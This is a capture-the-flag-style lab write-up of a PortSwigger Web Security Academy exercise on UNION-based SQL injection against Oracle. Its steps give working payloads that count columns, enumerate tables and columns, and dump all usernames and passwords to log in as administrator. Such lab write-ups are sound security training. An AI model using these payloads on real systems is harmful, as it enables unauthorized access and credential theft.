# SQL Injection - Listing the Database contents on Oracle

## 📌 Lab Details
- **Title**: SQL Injection - Retrieving the list of username and password of all users.
- **Difficulty**: Medium
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/de4256d42cc604a2a3f7e792c5fff88df1712f1537cd506ed2537efedbd4c665?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-listing-database-contents-oracle

## 🔍 Summary
This lab demonstrated how SQL Injection can be used to retrieve data from Oracle Databases.

## 🛠 Steps to Solve
1. Determine the number of columns present by injecting `'+UNION+SELECT+'abc','def'+FROM+DUAL--`
2. Injecting `'+UNION+SELECT+table_name,+NULL+FROM+all_tables--` to retrieve the list of tables in the database.
3. Injecting `'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='users_abcdef'--` to retrieve the details of the columns in the table (replacing the table name).
4. Injecting `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--` to retrieve the usernames and passwords of all users (replacing the table and column names).
5. Find the password of administrator to log in.
   
## 📖 Key Takeaways
- Understanding how SQL queries can be manipulated on Oracle Databases.
- Using `UNION` and `SELECT` commands to extract data from tables.
  
## 🖼️ Screenshot (if needed)
![image](https://github.com/user-attachments/assets/01553fe3-f943-4dee-ba8f-c070f6ff3fe2)
![image](https://github.com/user-attachments/assets/95a212c4-ef77-4d24-96b7-4f7807481baa)
![image](https://github.com/user-attachments/assets/32b46bec-0812-4822-ba9f-63cce9412c40)


